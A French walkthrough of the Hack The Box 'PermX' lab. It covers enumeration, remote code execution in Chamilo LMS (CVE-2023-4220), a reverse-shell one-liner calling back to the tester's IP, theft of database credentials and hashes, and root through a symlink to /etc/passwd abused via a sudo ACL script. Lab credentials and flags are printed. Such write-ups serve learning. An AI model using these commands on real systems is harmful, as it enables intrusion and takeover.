# Info de la box

```md
My IP: 10.10.16.4
IP Target: 10.10.11.23
OS: Linux (easy)
```

## Énumération

```bash
➜  ~ sudo nmap -sSVC -T5 -p- 10.10.11.23
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)  
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)  
80/tcp open  http    Apache httpd 2.4.52  
|_http-title: Did not follow redirect to http://permx.htb  
|_http-server-header: Apache/2.4.52 (Ubuntu)  
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On trouve donc le DNS à ajouter dans /etc/hosts pour accéder au site sur le port 80.

```bash
➜  ~ sudo nano /etc/hosts
10.10.11.23     permx.htb
```

On arrive sur une page de eLEARNING. 

Je lance un petit fuzzing de directory et pendant ce temps je vais faire de la recherche sur le site pour le découvrir.

```bash
➜  ~ sudo ffuf -w HDD/Documents/SecLists/Discovery/Web-Content/combined_directories.txt -u http://10.10.11.23/FUZZ -c -recursion -fw 18
```

RAS

Je décide donc de lancer un fuzz de DNS/Vhosts au cas où.

```bash
➜  ~ sudo ffuf -w HDD/Documents/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://permx.htb/ -H "Host:FUZZ.permx.htb" -c

lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353]  
www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587]
```

Bingo on trouve 2 vhosts !

on les ajoute au /etc/hosts

```bash
➜  ~ sudo nano /etc/hosts
10.10.11.23     permx.htb lms.permx.htb www.permx.htb
```

le vhost "www" renvoie sur le site de base, or lms.permx.htb sur une page d'authentification pour de l''administration. 

On regardera plus en bas du write up http://lms.permx.htb

On a fini pour l'énumération on a pas besoin de faire un whatweb, on a déjà réussi à choper toutes les informations à la main pendant les fuzz.
### Découverte de l'infra web

#### permx.htb

On peut noter 4 Creds d'instructeurs:

- Noah (Programmer)
- Elsie (Programmer)
- Ralph (Graphic Designer)
- Mia (Educator)

Mais aussi 4 Creds d'élèves:
- Johny (Data Scientist)
- Emma (Educator)
- Sarah (Web Developer)
- James (Graphic Designer)

Dans le footer on peut choper 1 adresse email: permx@htb.com
Mais on peut aussi découvrir des Web Templates: 

themewagon.com
htmlcodex.com

Ce qui m'a donné envie de voir les technos utilisées à l'aide de Wappalyzer:

- Serveur Web: Apache HTTP Server 2.4.52
- Librairie Javascript: OWL Carousel / jQuery 3.4.1
- OS: Ubuntu

On peut aussi voir des appels à des librairies dans le code HTML:

- Waypoints - 4.0.1
- wow.js - v1.3.0 - 2016-10-04

Dans le footer on peut aussi retrouver un input newsletter qui pourrait être intéressant d'approfondir à l'aide de burp.

- on peut voir qu'aucune requête est réalisée pour envoyer une data, alors c'est pas intéressant.

http://permx.htb/contact.html

Sur la page de contact il y a un formulaire qui serait aussi intéressant à regarder.
- XSS ?
- SQLi ?

Pour passer un premier test je vais regarder avec burpsuite s'il y a un envoi de data à l'aide de paramètres.

Ici on peut voir que c'est un GET qui est réalisé par la page, alors s'il y avait des datas d'envoyées elles seraient visibles depuis l'url, hors c'est pas le cas ici.

#### lms.permx.htb

On tente de se connecter avec des simples creds: admin/admin
Mais nan ça n'abouti pas.

On pourrait par la suite tenter un brute force.

Je vais d'abord énumérer le vhosts pour voir si on peut réussir à choper une version de framework etc vulnérable.

```bash
➜  ~ whatweb -a3 http://lms.permx.htb:80/  
http://lms.permx.htb:80/ [200 OK] Apache[2.4.52], Bootstrap, Chamilo[1], Cookies[GotoCourse,ch_sid], Country[RESERVED][ZZ], HTML5, 
HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], HttpOnly[GotoCourse,ch_sid], IP[10.10.11.23], JQuery, MetaGenerator[Chamilo 1], Modernizr, PasswordField[password], PoweredBy[Chamilo], 
Script, Title[PermX - LMS - Portal], X-Powered-By[Chamilo 1], 
X-UA-Compatible[IE=edge]  
```

On peut voir PoweredBy Chamilo j'ai donc décidé de voir ce que c'était.
	->LMS (Learning Management System)
## Exploitation

Mais ce qui est super c'est qu'ici on se trouve en présence de Chamilo 1 comme le montre le whatweb, or on trouve une RCE sur les versions <= 1.11.24 (CVE-2023-4220)

J'ai trouvé un exploit: https://github.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit?tab=readme-ov-file

je crée mon fichier reverse-shell.php ou je mets un payload de RCE, car je n'ai pas réussi à directement faire un reverse shell.

ensuite avec pwncat je me mets en écoute:

```bash
➜  Bureau pwncat-cs -lp 9014
```

et j'envoie ce payload qui réussi à établir un reverse shell.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.4 9014 >/tmp/f
```

## Privesc

Je check en rapide les users dans le /home, j'y trouve un répertoire mtz.

```bash
(remote) www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload$ ls -la /home  
total 12  
drwxr-xr-x  3 root root 4096 Jan 20  2024 .  
drwxr-xr-x 18 root root 4096 Jul  1 13:05 ..  
drwxr-x---  6 mtz  mtz  4096 Sep  2 14:00 mtz
```

Je continue d'énumérer:

```bash
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload$ ss -tln  
State         Recv-Q        Send-Q               Local Address:Port          
LISTEN        0             80                       127.0.0.1:3306
LISTEN        0             4096                 127.0.0.53%lo:53
LISTEN        0             128                        0.0.0.0:22
LISTEN        0             128                           [::]:22
LISTEN        0             511                              *:80
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload$ ss -tl  
State        Recv-Q        Send-Q               Local Address:Port         
LISTEN       0             80                       127.0.0.1:mysql
LISTEN       0             4096                 127.0.0.53%lo:domain
LISTEN       0             128                        0.0.0.0:ssh
LISTEN       0             128                           [::]:ssh
LISTEN       0             511                              *:http
(remote) www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload$
```

On voit donc qu'il y a une SGBD Mysql sur le port classique 3306.

On va donc chercher logiquement des creds dans l'infra.

J'ai réussi à chercher ou ce situe le fichier de configuration de chamilo.

Il suffit de l'afficher avec nano pour y voir les creds afficher dans le haut du fichier.

```bash
www-data@permx:/var/www/chamilo/app/config$ nano configuration.php
// Database connection settings.  
$_configuration['db_host'] = 'localhost';  
$_configuration['db_port'] = '3306';  
$_configuration['main_database'] = 'chamilo';  
$_configuration['db_user'] = 'chamilo';  
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
```

On peut désormais tenter de se connecter à la SGBD Mysql:

```bash
www-data@permx:/var/www/chamilo/app/config$ mysql -h localhost -P 3306 -u chamilo -p                    
Enter password:    
Welcome to the MariaDB monitor.  Commands end with ; or \g.  
Your MariaDB connection id is 88  
Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04  
  
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.  
  
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.  
  
MariaDB [(none)]>
```

let's go on est connecté :D

ensuite il reste plus qu'à aller dump la table qui nous intéresse.

```sql
MariaDB [(none)]> \u chamilo  
Reading table information for completion of table and column names  
You can turn off this feature to get a quicker startup with -A  
  
Database changed
MariaDB [chamilo]> SHOW TABLES;  
+-------------------------------------+  
| Tables_in_chamilo                   |  
+-------------------------------------+  
| access_url                          |  
| access_url_rel_course               |  
| access_url_rel_course_category      |  
| access_url_rel_session              |  
| access_url_rel_user                 |
| [...]                               |
| user                                |
+-------------------------------------+
MariaDB [chamilo]> SELECT * FROM user \G;  
*************************** 1. row ***************************  
                  id: 1  
             user_id: 1  
            username: admin  
  username_canonical: admin  
     email_canonical: admin@permx.htb  
               email: admin@permx.htb  
            lastname: Miller  
           firstname: Davis  
            password: $2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra  
               phone: (000) 001 02 03  
             address:    
                salt: awb0kMoTumbFvi22ojwv.Pg92gFTMOt837kWsGVbJN4  
          last_login: 2024-01-20 18:44:07  
               roles: a:1:{i:0;s:16:"ROLE_SUPER_ADMIN";}  
       official_code: ADMIN  
            language: english  
   registration_date: 2024-01-20 18:20:32  
*************************** 2. row ***************************  
                  id: 2  
             user_id: 2  
            username: anon  
  username_canonical: anon  
     email_canonical: anonymous@example.com  
               email: anonymous@example.com  
            lastname: Anonymous  
           firstname: Joe  
            password: $2y$04$wyjp2UVTeiD/jF4OdoYDquf4e7OWi6a3sohKRDe80IHAyihX0ujdS  
               phone:    
             address:    
                salt: Mr1pyTT.C/oEIPb/7ezOdrCDKM.KHb0nrXAUyIyt/MY  
               roles: a:0:{}  
       official_code: anonymous  
            language: english  
   registration_date: 2024-01-20 18:20:32  
2 rows in set (0.001 sec)
```

Avec le mdp pour se connecter à mysql j'essaye de sudo -l pour voir si il y a une réutilisation de mdp pour www-data, mais nan.

Alors j'essaye pour mtz.

```bash
(remote) www-data@permx:/var/www/chamilo/app/config$ su mtz  
Password:    
mtz@permx:/var/www/chamilo/app/config$ ls -l
```

Bingo ! on est mtz maitenant.

```sh
mtz@permx:~$ cat user.txt    
6d5a1d93c9bd2146b7c7b47ec8107e5c
```

On a flag l'user. Il nous reste maintenant à devenir root.

Je check vite fait les droits sudo de l'user mtz.

```bash
mtz@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ sudo -l  
Matching Defaults entries for mtz on permx:  
   env_reset, mail_badpass,  
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty  
  
User mtz may run the following commands on permx:  
   (ALL : ALL) NOPASSWD: /opt/acl.sh  
```

Pouf je vois que j'ai les droits sudo sur le script /opt/acl.sh

Je décide de l'afficher pour voir ce qu'il fait.

```bash
mtz@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ cat /opt/acl.sh
#!/bin/bash  
  
if [ "$#" -ne 3 ]; then  
   /usr/bin/echo "Usage: $0 user perm file"  
   exit 1  
fi  
  
user="$1"  
perm="$2"  
target="$3"  
  
if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then  
   /usr/bin/echo "Access denied."  
   exit 1  
fi  
  
# Check if the path is a file  
if [ ! -f "$target" ]; then  
   /usr/bin/echo "Target must be a file."  
   exit 1  
fi  
  
/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

On devine qu'on doit reverse ce petit script écrit en bash. Donc ici pas besoin de lancer un linpeas.

on voit que le file prend un user, des droits et le fichiers auxquelles on veut changer les droits pour l'user.

Je fais un premier test:

```bash
mtz@permx:/opt$ sudo ./acl.sh mtz 777 /root/root.txt  
Access denied.
```

Evidemment ici ça ne va pas marcher car le script vérifie si on change bien les perms d'un fichier contenu dans /home/mtz :D

Alors j'ai comme idée de faire un fichier root.txt qui aura un lien symbolink pointant sur /root/root.txt

```bash
mtz@permx:~$ cd root/  
mtz@permx:~/root$ touch root.txt  
mtz@permx:~/root$ ls -l  
total 0  
-rw-rw-r-- 1 mtz mtz 0 Sep  3 15:52 root.txt  
mtz@permx:~/root$ cd ..  
mtz@permx:~$ ln -s ./root/root.txt /root/root.txt
ln: failed to create symbolic link '/root/root.txt': Permission denied
```

mais ça ne marche pas :"(

```bash
mtz@permx:/opt$ sudo ./acl.sh mtz 777 /home/mtz/./../../root/root.txt  
Access denied.
```

Bon après avoir passé pas mal de temps, je trouve une solution.

Il faut donc commencer par créer le lien symbolink

```bash
mtz@permx:~$ ln -sf /etc/passwd /home/mtz/payload
```

je mets l'option f en plus pour forcer la création si jamais il veut pas.

ensuite je fais appel au script en me donnant les droits d'accès total pour payload qui est donc un lien de passwd.

```bash
mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/payload
```

Puis il me reste plus qu'à créer un user que j'ai nommé pwnme ici, en lui enlevant son mdp et lui donnant les privilèges root.

```bash
mtz@permx:~$ echo "pwnme::0:0:pwnme:/root:/bin/bash" >> /home/mtz/payload
```

et voilà plus qu'à passer en tant que pwnme et on est root :D

```bash
mtz@permx:~$ su pwnme  
root@permx:/home/mtz# cd /root
root@permx:~# ls -l  
total 12  
drwxr-xr-x 2 root root 4096 Jun  5 12:25 backup  
-rwxr-xr-x 1 root root  354 Jun  6 05:25 reset.sh  
-rw-r----- 1 root root   33 Sep  8 16:55 root.txt  
root@permx:~# cat root.txt    
5b3a33094ad3db37ffdba58e922b31c7
```

